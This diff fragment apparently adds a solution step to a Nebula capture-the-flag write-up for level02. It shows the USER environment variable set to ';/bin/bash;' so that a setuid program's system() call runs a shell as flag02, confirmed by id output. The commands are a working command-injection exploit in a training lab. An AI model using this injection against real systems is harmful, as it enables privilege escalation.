@@ -93,3 +93,12 @@ int main(int argc, char **argv, char **envp)
   system(buffer);
 }
 ```
+
+```console
+level02@nebula:~$ USER=";/bin/bash;"
+level02@nebula:~$ ../flag02/flag02
+about to call system("/bin/echo ;/bin/bash; is cool")
+
+flag02@nebula:~$ id
+uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)
+```
